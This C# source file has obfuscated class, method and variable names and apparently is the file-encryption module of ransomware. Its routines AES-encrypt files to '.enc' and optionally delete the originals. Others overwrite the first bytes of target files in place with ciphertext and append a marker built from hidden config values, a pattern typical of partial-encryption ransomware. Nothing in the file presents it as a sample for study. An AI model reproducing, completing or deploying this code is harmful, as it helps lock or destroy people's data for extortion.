using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace ALzLGBAFaCqNDAE;

public static class GTRtlZMjZZbcvl
{
	public const int MElHgEqkAFD = 256;

	public static byte[] LVeIMhyDtRy(int dnUmvRLcGmOawo)
	{
		byte[] array = new byte[dnUmvRLcGmOawo];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool GeHqOMkdDYCDi(string XmSbfPdlIzSG, byte[] EABPentlsq, bool zRyFVkinIyn)
	{
		byte[] array = LVeIMhyDtRy(16);
		using FileStream fileStream = new FileStream(XmSbfPdlIzSG + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = FKRmtNHmiZgFP(EABPentlsq, array);
		EABPentlsq = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(XmSbfPdlIzSG, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (zRyFVkinIyn)
			{
				File.Delete(XmSbfPdlIzSG);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool XRwmGBcjhPs(string VZRClqDZbCN, byte[] rkHGeBihhoqbja, bool hqtWfqyCCRQATI)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(VZRClqDZbCN, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = FKRmtNHmiZgFP(rkHGeBihhoqbja, array);
		rkHGeBihhoqbja = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(VZRClqDZbCN.Remove(VZRClqDZbCN.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] uLcsZkADwbGAt(byte[] KionDwaKOxROt, byte[] MOnrFNzCqaLz, byte[] PyQqHcCvhhr)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = FKRmtNHmiZgFP(MOnrFNzCqaLz, PyQqHcCvhhr);
		MOnrFNzCqaLz = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(KionDwaKOxROt, 0, KionDwaKOxROt.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] IOZDkKVQipDV(byte[] GRrkDCqwcb, byte[] mGoZLwoHpgumc, byte[] ojmUNeYajfwZ)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = FKRmtNHmiZgFP(mGoZLwoHpgumc, ojmUNeYajfwZ);
		mGoZLwoHpgumc = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(GRrkDCqwcb, 0, GRrkDCqwcb.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool oOPcXVATHxzej(byte[] iJIUcqYZSllj, byte[] mvWNmDHvaREQN, byte[] NkBEqLsGlUNE)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = FKRmtNHmiZgFP(iJIUcqYZSllj, mvWNmDHvaREQN);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(NkBEqLsGlUNE);
	}

	public static Rfc2898DeriveBytes FKRmtNHmiZgFP(byte[] lPqNibfPeNl, byte[] KOsPqRJVNTEqqsNY)
	{
		return new Rfc2898DeriveBytes(lPqNibfPeNl, KOsPqRJVNTEqqsNY, 52768);
	}

	public static byte[] SYxHOqaALSG(string bHotJVRYyZfCSY, int XvAgumuiGGcMfb)
	{
		byte[] array = new byte[XvAgumuiGGcMfb];
		try
		{
			if (RMvUnHFCuFhAD.AbkRtlPjZlew == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(bHotJVRYyZfCSY, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, XvAgumuiGGcMfb);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(bHotJVRYyZfCSY, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, XvAgumuiGGcMfb);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception)
		{
			FileStream fileStream2 = new FileStream(bHotJVRYyZfCSY, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, XvAgumuiGGcMfb);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void XzYjQpMihHQzL(string dkPTMYfHhVUQFz, byte[] guOBwaFgYVP)
	{
		try
		{
			if (RMvUnHFCuFhAD.AbkRtlPjZlew == "YES")
			{
				byte[] bytes = Encoding.ASCII.GetBytes(RMvUnHFCuFhAD.tRvIdsqgaYol(RMvUnHFCuFhAD.seVIVtnfPDeH) + RMvUnHFCuFhAD.tRvIdsqgaYol("LQ==") + Convert.ToString(RMvUnHFCuFhAD.qVisayOOulGyyq) + RMvUnHFCuFhAD.tRvIdsqgaYol("LQ=="));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(dkPTMYfHhVUQFz, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(guOBwaFgYVP, 0, guOBwaFgYVP.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(dkPTMYfHhVUQFz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream.Write(bytes, 0, bytes.Length);
				return;
			}
			byte[] bytes2 = Encoding.ASCII.GetBytes(RMvUnHFCuFhAD.tRvIdsqgaYol(RMvUnHFCuFhAD.seVIVtnfPDeH) + RMvUnHFCuFhAD.tRvIdsqgaYol("LQ==") + Convert.ToString(RMvUnHFCuFhAD.qVisayOOulGyyq) + RMvUnHFCuFhAD.tRvIdsqgaYol("LQ=="));
			FileStream fileStream2 = new FileStream(dkPTMYfHhVUQFz, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(guOBwaFgYVP, 0, guOBwaFgYVP.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(dkPTMYfHhVUQFz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream3.Write(bytes2, 0, bytes2.Length);
		}
		catch (Exception)
		{
			byte[] bytes3 = Encoding.ASCII.GetBytes(RMvUnHFCuFhAD.tRvIdsqgaYol(RMvUnHFCuFhAD.seVIVtnfPDeH) + RMvUnHFCuFhAD.tRvIdsqgaYol("LQ==") + Convert.ToString(RMvUnHFCuFhAD.qVisayOOulGyyq) + RMvUnHFCuFhAD.tRvIdsqgaYol("LQ=="));
			FileStream fileStream4 = new FileStream(dkPTMYfHhVUQFz, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(guOBwaFgYVP, 0, guOBwaFgYVP.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(dkPTMYfHhVUQFz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream5.Write(bytes3, 0, bytes3.Length);
		}
	}
}
